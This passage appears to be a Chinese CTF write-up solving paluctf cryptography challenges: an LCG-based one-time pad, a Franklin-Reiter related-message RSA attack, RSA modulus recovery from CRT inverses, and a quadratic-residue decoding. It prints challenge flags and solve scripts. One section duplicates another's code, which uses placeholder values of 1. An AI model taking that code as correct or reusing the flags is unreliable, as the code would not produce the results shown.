',<br />\n'o': ' 阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰 ',<br />\n'p': ' 伊卡阿卡噢伊卡阿卡噢轰 ',<br />\n'q': ' 伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰 ',<br />\n'r': ' 伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰 ',<br />\n's': ' 哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰 ',<br />\n't': ' 哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰 ',<br />\n'u': ' 哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰 ',<br />\n'v': ' 咿呀呦咿呀呦轰 ',<br />\n'w': ' 咿呀呦咿呀呦咿呀呦轰 ',<br />\n'x': ' 咿呀呦咿呀呦咿呀呦咿呀呦轰 ',<br />\n'y': ' 咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰 ',<br />\n'z': ' 玛卡雅卡玛卡雅卡轰 ',<br />\n'A': ' 玛卡雅卡玛卡雅卡玛卡雅卡轰 ',<br />\n'B': ' 玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰 ',<br />\n'C': ' 伊卡阿卡伊卡阿卡轰 ',<br />\n'D': ' 伊卡阿卡伊卡阿卡伊卡阿卡轰 ',<br />\n'E': ' 伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰 ',<br />\n'F': ' 咿呀巴卡咿呀巴卡轰 ',<br />\n'G': ' 咿呀巴卡咿呀巴卡咿呀巴卡轰 ',<br />\n'H': ' 咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰 ',<br />\n'I': ' 咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰 ',<br />\n'J': ' 达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'K': ' 达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'L': ' 达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'M': ' 达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰 ',<br />\n'N': ' 巴卡巴卡轰 ',<br />\n'O': ' 巴卡巴卡巴卡巴卡轰 ',<br />\n'P': ' 巴卡巴卡巴卡巴卡巴卡巴卡轰 ',<br />\n'Q': ' 巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰 ',<br />\n'R': ' 巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰 ',<br />\n'S': ' 呀呦轰 ',<br />\n'T': ' 呀呦呀呦轰 ',<br />\n'U': ' 呀呦呀呦呀呦轰 ',<br />\n'V': ' 呀呦呀呦呀呦呀呦轰 ',<br />\n'W': ' 呀呦呀呦呀呦呀呦呀呦轰 ',<br />\n'X': ' 达姆阿卡轰 ',<br />\n'Y': ' 达姆阿卡达姆阿卡轰 ',<br />\n'Z': ' 达姆阿卡达姆阿卡达姆阿卡轰 ',<br />\n'0': ' 达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰 ',<br />\n'1': ' 达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰 ',<br />\n'2': ' 玛巴轰 ',<br />\n'3': ' 玛巴玛巴轰 ',<br />\n'4': ' 玛巴玛巴玛巴轰 ',<br />\n'5': ' 玛巴玛巴玛巴玛巴轰 ',<br />\n'6': ' 巴卡玛巴轰 ',<br />\n'7': ' 巴卡玛巴巴卡玛巴轰 ',<br />\n'8': ' 巴卡玛巴巴卡玛巴巴卡玛巴轰 ',<br />\n'9': ' 巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰 ',<br />\n'=': ' 妈个巴子轰 ',<br />\n'/': ' 妈个巴卡轰 ',<br />\n'+': ' 妈个巴达轰 ',<br />\n}</p>\n<p v:=\"\" k=\"\" for=\"\" k,=\"\" v=\"\" in=\"\" encoding_rules.items()=\"\"><em>#</em> <em>反转编码规则，以便进行解密</em><br />\n decoding_rules =</p>\n<p>def decode(encoded_str):<br />\ndecoded_str = ''<br />\nwhile encoded_str:<br />\nfor key in sorted(decoding_rules, key=len, reverse=True): <em>#</em> <em>根据长度降序排序确保正确匹配</em><br />\n if encoded_str.startswith (key):<br />\ndecoded_str += decoding_rules[key]<br />\nencoded_str = encoded_str[len(key):] <em>#</em> <em>移除已解码部分</em><br />\n break<br />\nreturn decoded_str</p>\n<p><em>#</em> <em>要解码的字符串</em><br />\n encoded_message = ' 玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰'<br />\ndecoded_message = decode(encoded_message)<br />\nprint(decoded_message)</p>\n<h3 id=\"lcccg\"><a class=\"anchor\" href=\"#lcccg\">#</a> lcccg</h3>\n<p>理论上，除非您知道密钥，否则一次性密码本是不可能破译的，但如果您知道密钥，当然可以将其恢复。<br />\n密钥仅由随机数生成的值的第 1 位串联而成，长度为明文 + 50 位。<br />\n由于我们对明文进行异或，因此它看起来像这样：</p>\n<p>|--------------------------key----------------------|<br />\n|-------------plain_text-------------|<br />\n|--key(50bit)--|-------------key^plain_text---------|</p>\n<p>plain_text 没有办法比知道更多 key^plain_text，但关键（50 位）部分按原样输出。让我们尽力从这里恢复密钥。</p>\n<p>这次使用线性同余法找到密钥，但它有一个稍微特殊的参数，如下所示。</p>\n<p>x1 = 2 * x0 % m <em># m** 保证是奇数</em></p>\n<p>现在，通常情况下，如果将其加倍，您会得到一个偶数，但由于您用奇数取余数，因此不一定会得到偶数。什么情况下？X 会是奇数吗？这是 2x&gt;=m 这就是时机。</p>\n<p>由此，通过知道 x1 的第 1 位是 0 还是 1 , 两次 LCG 它成为了</p>\n<p>x2 = 2 * x1 = 4 * x0 % m</p>\n<p>以同样的方式思考，当你想知道 x0 的值时</p>\n<p>\\1.     x1 的值为偶数时为左半部分，为奇数时为右半部分</p>\n<p>\\2.     如果 x2 的值为偶数，则为红色，如果为奇数，则为绿色。</p>\n<p>\\3.     如果 x3 的值为偶数，则为红色，如果为奇数，则为绿色。</p>\n<p>这样，您可以根据数字是偶数还是奇数将 x0 减半。</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/ZUimCOP1seXfIVE.png\" alt=\"标题: fig:\" /></p>\n<p>由于每次可以获得 1bit 的信息，然而，不幸的是，x 只给出了前 50 位。回顾一下之前的算法，2^64 如果减半 50 次，2^64 /250=214=16384 这是一个可以使用暴力的领域。</p>\n<p>之后，如果出现的字符串 paluctf 包含在内，那就是 flag</p>\n<p>from fractions import Fraction<br />\nfrom Crypto.Util.number import *</p>\n<p>def get_x(cipher, pos, m, length):<br />\nhoge = []<br />\nwhile cipher &gt; 0:<br />\nhoge.append(cipher % 2)<br />\ncipher &gt;&gt;= 1</p>\n<p>while(len(hoge) &lt; length):<br />\nhoge.append(0)</p>\n<p>hoge = hoge[pos+1:]</p>\n<p>low = Fraction(0, 1)<br />\nhigh = Fraction(m, 1)</p>\n<p>for i in range(len(hoge)):<br />\nmid = (low+high)/2<br />\nif hoge[i] == 0:<br />\nhigh = mid<br />\nelse:<br />\nlow = mid</p>\n<p>return low.<strong>ceil</strong>(), high.<strong>floor</strong>()</p>\n<p>def challenge(cipher, length, m, x):<br />\ninv2 = pow(2, -1, m)<br />\nxs = [0] * (length+1)<br />\nxs[length] = x<br />\nfor i in range(length, 0, -1):<br />\nxs[i-1] = xs[i] * inv2 % m</p>\n<p>rand = 0<br />\nfor i in range(length):<br />\nrand += (xs[i] &amp; 1) &lt;&lt; i</p>\n<p>num = ((1 &lt;&lt; length) - 1) &amp; (cipher ^ rand)<br />\nif b'ctf' in long_to_bytes(num) :<br />\nprint(long_to_bytes(num))</p>\n<p>m = 7870528503754256659<br />\nlength = 311<br />\ncipher = 3255815260238431584829132773479447408817850185229659648404208268001256903206776002292220185602856730646093869<br />\nlow, high = get_x(cipher, length, m, length + 50)<br />\nprint(high - low)<br />\nfor x in range(low, high+1):<br />\nchallenge(cipher, length, m, x)</p>\n<h3 id=\"gcccd\"><a class=\"anchor\" href=\"#gcccd\">#</a> gcccd</h3>\n<p>m 从注释中可以看出，该标志是用填充加密的，看起来是 PKCS#1 v1.5 ( )。问题的关键 m 在于 m // 2 它还给了我们加密的结果。</p>\n<p>} 考虑到该标志以 结尾 m，因此它变为奇数（} 其 ASCII 码为 0x7d = 125）。这是 m // 2 真的 (m-1) // 2。</p>\n<p>m // 2 存在 m=2*m2+1 关系如果使用相同的公钥对具有线性关系的两个明文进行加密，请使用 Franklin-Reiter 相关消息攻击，因为它是有效的。</p>\n<p>from Crypto.Util.number import*</p>\n<p>n = 128134155200900363557361770121648236747559663738591418041443861545561451885335858854359771414605640612993903005548718875328893717909535447866152704351924465716196738696788273375424835753379386427253243854791810104120869379525507986270383750499650286106684249027984675067236382543612917882024145261815608895379<br />\ne = 5331<br />\nc1 = 60668946079423190709851484247433853783238381043211713258950336572392573192737047470465310272448083514859509629066647300714425946282732774440406261265802652068183263460022257056016974572472905555413226634497579807277440653563498768557112618320828785438180460624890479311538368514262550081582173264168580537990<br />\nc2 = 43064371535146610786202813736674368618250034274768737857627872777051745883780468417199551751374395264039179171708712686651485125338422911633961121202567788447108712022481564453759980969777219700870458940189456782517037780321026907310930696608923940135664565796997158295530735831680955376342697203313901005151<br />\ndef gcd(g1, g2):<br />\nwhile g2:<br />\ng1, g2 = g2, g1 % g2<br />\nreturn g1.monic()</p>\n<p>PRx.&lt;x&gt; = PolynomialRing(Zmod(n))<br />\ng1 = x^e - c2<br />\ng2 = (x*2 + 1)^e - c1</p>\n<p>result = -gcd(g1, g2).coefficients()[0]<br />\nprint(long_to_bytes(int(result*2 + 1)))</p>\n<h3 id=\"peeeq\"><a class=\"anchor\" href=\"#peeeq\">#</a> peeeq</h3>\n<p>首先这里 check 判断的是 m = a * p + b * q 是否存在大于 a&gt;0 且 b&gt;0 的解</p>\n<p>而 while 里的断言 表明 a * p + b * q 最大不能表示的数字 为 leak</p>\n<p><strong>数论：p , q**** 互质</strong> <strong>，</strong> <strong>则最大不能表示的数为：pq - p - q</strong> <strong>即 phi - 1</strong></p>\n<p>所以 phi = leak + 1</p>\n<p>根据 e 的 17 位，然后 gcd 去得到 k*e，最后得到 e</p>\n<p>pinv_e = 12474140378771043865022148848078136936465079800066130234618983104385642778672967864991495110508733111980066517889153671507701349679185396054215439179349403857665966245686661757089470553109534987101888628107055364941617805783362125836104920292552457095662777743387917809524955960583091720618281570118299619677634759<br />\nqinv_e = 1647206449953560407401595632741127506095799998014240087894866808907042944168674423038307995055460808040825182837354682801054048594394389801771888111156812819183105159993880849157459496014737241461466870906700457127028184554416373467332704931423207098246831148428600375416541264997943693621557486559170922000282251<br />\nke = gcd(pinv_e, qinv_e)<br />\nprint(ke.bit_length())<br />\ne = ke // 3<br />\nprint(e)<br />\ne = 102563</p>\n<p>phi 已知可以轻松求出 d，难点在于根据 qinv 和 pinv 复原 n</p>\n<p>我们可以找到 phi (n) = (p - 1) * (q - 1) 存在 k 范围在 3 到 e - 1 满足以下式子</p>\n<p>e * d == 1 (mod phi(n)) e * d == k * phi(n) + 1 <code> 其中</code>  d &lt;phi (n), e &gt; k &gt;= 3</p>\n<p>设 k1, k2 满足以下方程</p>\n<p>qinv, pinv == inverse(q, p), inverse(p, q) q * qinv == 1 + k1 * p p * pinv == 1 + k2 * q</p>\n<p>通过将两个方程相减，得到 q * (qinv + k2) == p * (pinv + k1). p 和 q 是素数且不相同的，所以 得到 p = qinv + k2 以及 q = pinv + k1. 带入 k1 = q - y 到 q * x = 1 + (q - y) * p 得到 x * y = 1 + k1 * k2</p>\n<p>phi (n) 可以继续改写成以下方程</p>\n<p>$ phi(n) = (p - 1) * (q - 1)    = (qinv + k2 - 1) * (pinv + k1 - 1)    \\ = (qinv - 1 + k2) * (pinv - 1 + k1) \\    = (x - 1) * (y - 1) + (x - 1) * k1 + (y - 1) * k2 + k1 * k2 $</p>\n<p>现在可以 遍历 k1 的所有可能，构造关于 pinv (x) 和 qinv (y) 的二元一次方程.</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/OfjWp7y9eQb1qz3.png\" alt=\"img\" /></p>\n<p>进而恢复 k1, k2, p, q and n.</p>\n<p>知道 n 和 d ,flag 就能够轻松获取</p>\n<p>e = 102563<br />\nleak = 20650913970072868759959272239604024297420806808659110564312051736808778949599012338389873196411652566474168134639876252857623310159737758732845898956842366935678501021994729279299799994075598575657211550223683499328614158165787416177094173112167115888930719187253398687736037116845083325669521670262760600243895871953940839864925909273175442587377607028910874730344252804963645659770898616148180806608083557249713184454706023876544328444568520666837841566163924062054001534893538655581481021600384148478571641075265311650046699619525464106135807483192890198614434965478741402348088647355476402189540171838712520668315<br />\nphi = leak + 1<br />\nct = 14656499683788461319601710088831412892194505254418064899761498679297764485273476341077222358310031603834624959088854557947176472443021560072783573052603773463734827298069959304747376040480522193600487999140388188743055733577433643210327070027972481119823973316743393323273128561824747871183252082782459568278265418266528855123687868624734106855360408027492126167597948385055908257193701028960507382053300960017612431744000472268868103779169759349652561826935960615964589526055579319224213399173783902104833907847546751649110661705034653912439791460180154034041113546810232929706136321281991114377628823527206109309013<br />\nx = 12474140378771043865022148848078136936465079800066130234618983104385642778672967864991495110508733111980066517889153671507701349679185396054215439179349403857665966245686661757089470553109534987101888628107055364941617805783362125836104920292552457095662777743387917809524955960583091720618281570118299619677634759//e<br />\ny = 1647206449953560407401595632741127506095799998014240087894866808907042944168674423038307995055460808040825182837354682801054048594394389801771888111156812819183105159993880849157459496014737241461466870906700457127028184554416373467332704931423207098246831148428600375416541264997943693621557486559170922000282251//e<br />\nimport gmpy2<br />\nd = gmpy2.invert(e, phi)<br />\nkn = e * d - 1<br />\ncount = 0</p>\n<p>def solve(a, b, c):<br />\nD = b ** 2 - 4 * a * c<br />\nassert gmpy2.is_square(D)<br />\nx1 = (-b + gmpy2.isqrt(D)) // (2 * a)<br />\nx2 = (-b - gmpy2.isqrt(D)) // (2 * a)<br />\nreturn x1, x2</p>\n<p>for k in range(3, e):<br />\nif kn % k == 0:<br />\ncount += 1<br />\nphi_n = kn // k<br />\n<em># coefficients of quadratic eq</em><br />\na = x - 1<br />\nb = x * y - 1 + (x - 1) * (y - 1) - phi_n<br />\nc = (y - 1) * (x * y - 1)<br />\ntry:<br />\nk1, k2 = solve(a, b, c)<br />\nif (x * y - 1) % k1 == 0:<br />\nk2 = (x * y - 1) // k1<br />\nelif (x * y - 1) % k2 == 0:<br />\nk1, k2 = k2, (x * y - 1) // k2<br />\nelse:<br />\nassert False<br />\np, q = x + k2, y + k1<br />\nN = p * q</p>\n<pre><code>   flag = long_to_bytes(pow(ct, d, N)).strip() \n   break \n except AssertionError: \n   pass \n</code></pre>\n<p 51b98a17-6843-4e3b-b06c-3cd956bc944c=\"\">print(flag)<br />\npaluctf</p>\n<h3 id=\"simple_crypto\"><a class=\"anchor\" href=\"#simple_crypto\">#</a> simple_crypto</h3>\n<p><a href=\"https://www.t00ls.com/articles-49265.html\"><em>https://www.t00ls.com/articles-49265.html</em></a></p>\n<p>一模一样的题</p>\n<p bba475793d9fecdc698eb4f36fcf539e=\"\">flag</p>\n<p>from Crypto.Util.number import *<br />\nfrom gmpy2 import *<br />\ngift1 = 1<br />\ngift2 = 1<br />\nn = 1<br />\nc = 1<br />\np = GCD(gift1 + gift2,n)<br />\nq = iroot(n // p , 2)[0]</p>\n<p>flag = &quot;&quot;<br />\nfor i in c:<br />\nif(pow(i,(p-1)//2,p) == 1):<br />\nflag += &quot;0&quot;<br />\nelse:<br />\nflag += &quot;1&quot;<br />\nprint(long_to_bytes(int(flag[::-1],2)))<br />\nb'paluctf{1_4m_th3_b0td_1n_t3st_1n_th3_r0w}’</p>\n<h3 id=\"01110\"><a class=\"anchor\" href=\"#01110\">#</a> 01110</h3>\n<p>from Crypto.Util.number import *<br />\nfrom gmpy2 import *<br />\ngift1 = 1<br />\ngift2 = 1<br />\nn = 1<br />\nc = 1<br />\np = GCD(gift1 + gift2,n)<br />\nq = iroot(n // p , 2)[0]</p>\n<p>flag = &quot;&quot;<br />\nfor i in c:<br />\nif(pow(i,(p-1)//2,p) == 1):<br />\nflag += &quot;0&quot;<br />\nelse:<br />\nflag += &quot;1&quot;<br />\nprint(long_to_bytes(int(flag[::-1],2)))<br />\nb'paluctf{1_4m_th3_b0td_1n_t3st_1n_th3_r0w}’</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>=</mo><mo stretchy=\"false\">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><msup><mo stretchy=\"false\">)</mo><mi>s</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak=\"newline\"></mspace><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>=</mo><mo stretchy=\"false\">(</mo><mi>p</mi><mo>−</mo><mi>q</mi><msup><mo stretchy=\"false\">)</mo><mi>s</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">gift1 = (p + q)^s mod n \\\\ gift2 = (p - q)^s mod n\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span></span></span></span></span></p>\n<p>二项式展开得</p>\n<p>(1) + (2) 得</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>=</mo><msup><mi>p</mi><mi>s</mi></msup><mo>+</mo><msup><mi>q</mi><mi>s</mi></msup><mo stretchy=\"false\">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>=</mo><msup><mi>p</mi><mi>s</mi></msup><mo>−</mo><msup><mi>q</mi><mi>s</mi></msup><mo stretchy=\"false\">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>p</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>+</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mtext>又</mtext><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mo stretchy=\"false\">(</mo><mi>q</mi><mo>∗</mo><mo>∗</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mo>=</mo><mo>&gt;</mo><mi>q</mi><mo>=</mo><mi>i</mi><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mo stretchy=\"false\">(</mo><mi>n</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>p</mi><mo separator=\"true\">,</mo><mn>2</mn><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">gift1 = p^s + q^s (mod n)  (1) \\\\ gift2 = p^s - q^s (mod n)  (2)\\\\p = gcd(hint1 + hint2, n) \\\\ 又n = p * (q ** 2) =&gt; q = iroot(n // p , 2) [0]\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9088319999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9088319999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7143919999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">又</span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6597200000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" 